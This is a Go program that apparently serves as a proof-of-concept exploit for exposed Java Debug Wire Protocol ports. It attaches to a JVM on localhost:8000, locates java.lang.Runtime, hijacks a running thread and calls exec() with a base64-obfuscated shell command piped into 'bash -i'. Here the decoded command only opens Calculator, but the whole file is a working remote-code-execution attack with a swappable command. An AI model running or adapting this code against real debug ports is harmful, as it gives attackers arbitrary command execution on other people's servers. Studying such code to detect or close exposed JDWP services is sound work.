package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"github.com/kpli0rn/jdwpgo/common"
	"github.com/kpli0rn/jdwpgo/debuggercore"
	"github.com/kpli0rn/jdwpgo/jdwpsession"
	"github.com/kpli0rn/jdwpgo/protocol/vm"
	"log"
	"net"
	"strconv"
)

func main() {

	conn, err := net.Dial("tcp", "localhost:8000")
	if err != nil {
		fmt.Printf("error dial: %v\n", err)
		return
	}
	s := jdwpsession.New(conn)
	err = s.Start()
	if err != nil {
		fmt.Printf("error start: %v\n", err)
		return
	}
	debuggerCore := debuggercore.NewFromJWDPSession(s)
	version, err := debuggerCore.VMCommands().Version()
	if err != nil {
		fmt.Printf("err = %v\n", err)
		return
	}
	log.Println("[+] Jvm Version = \n%v\n", version)
	allClasses, err := debuggerCore.VMCommands().AllClasses()
	if err != nil {
		fmt.Printf("err = %v\n", err)
	}
	idSizes, err := debuggerCore.VMCommands().IDSizes()
	if err != nil {
		fmt.Printf("err = %v\n", err)
		return
	}
	fmt.Printf("[+] idSizes = %v\n", idSizes)
	var runtimeClas vm.AllClassClass
	for _, clas := range allClasses.Classes {
		if clas.Signature.String() == "Ljava/lang/Runtime;" {
			runtimeClas = clas
		}
	}
	fmt.Println(fmt.Sprintf("[+] Found Runtime class: id=%v", runtimeClas.ReferenceTypeID))
	methods, _ := debuggerCore.VMCommands().AllMethods(runtimeClas.ReferenceTypeID)
	getRuntimeMethod := common.GetMethodByName(methods, "getRuntime")
	if getRuntimeMethod == nil {
		return
	}
	fmt.Println(fmt.Sprintf("[+] Found Runtime.getRuntime(): %s", getRuntimeMethod.String()))
	threads, err := debuggerCore.VMCommands().AllThreads()
	if err != nil {
		fmt.Printf("err = %v\n", err)
	}
	var threadID uint64
	for _, thread := range threads.Threads {
		threadStatus, _ := debuggerCore.VMCommands().StatusThread(thread.ObjectID)
		if threadStatus.ThreadStatus == 2 {
			threadID = thread.ObjectID
			break
		}
	}
	fmt.Println(fmt.Sprintf("[+] Setting 'step into' event in thread: %v", threadID))
	debuggerCore.VMCommands().Suspend()
	reply, err := debuggerCore.VMCommands().SendEventRequest(1, threadID)
	if err != nil {
		fmt.Println("Could not find a suitable thread for stepping\n")
		return
	}
	debuggerCore.VMCommands().Resume()

	buf := make([]byte, 128)
	var rId int32
	var tId uint64
	num, _ := conn.Read(buf)
	if num != 0 {
		replyData := buf[:num]
		rId, tId = common.ParseEvent(replyData, reply.RequestID, idSizes)
	}
	fmt.Println(fmt.Sprintf("[+] Received matching event from thread %v", tId))
	debuggerCore.VMCommands().ClearCommand(rId)

	// Step 1 allocating string
	createStringReply, _ := debuggerCore.VMCommands().CreateString("bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}")
	if createStringReply == nil {
		log.Fatalln("[-] Failed to allocate command")
	}
	cmdObjectID := createStringReply.StringObject.ObjectID
	fmt.Println(fmt.Sprintf("[+] Command string object created id:%v", cmdObjectID))

	// step 2 通过调用 getRuntime 来获取 Runtime 对象
	invokeStaticMethodReply, _ := debuggerCore.VMCommands().InvokeStaticMethod(runtimeClas.ReferenceTypeID, tId, getRuntimeMethod.MethodID)
	if invokeStaticMethodReply.ContextID == 0 {
		return
	}
	fmt.Println(fmt.Sprintf("[+] Runtime.getRuntime() returned context id:%v", invokeStaticMethodReply.ContextID))

	// step 3
	execMethod := common.GetMethodByName(methods, "exec")
	if execMethod == nil {
		return
	}
	fmt.Println(fmt.Sprintf("[+] found Runtime.exec(): id=%v\n", execMethod.MethodID))

	cmdObjectIDHex := make([]byte, 8)
	binary.BigEndian.PutUint64(cmdObjectIDHex, cmdObjectID)
	argsIDHex := strconv.FormatInt(int64(invokeStaticMethodReply.Tag), 16) + hex.EncodeToString(cmdObjectIDHex)
	argsID, _ := hex.DecodeString(argsIDHex)
	debuggerCore.VMCommands().InvokeMethod(invokeStaticMethodReply.ContextID, tId, runtimeClas.ReferenceTypeID, execMethod.MethodID, argsID)
	debuggerCore.VMCommands().Resume()
}
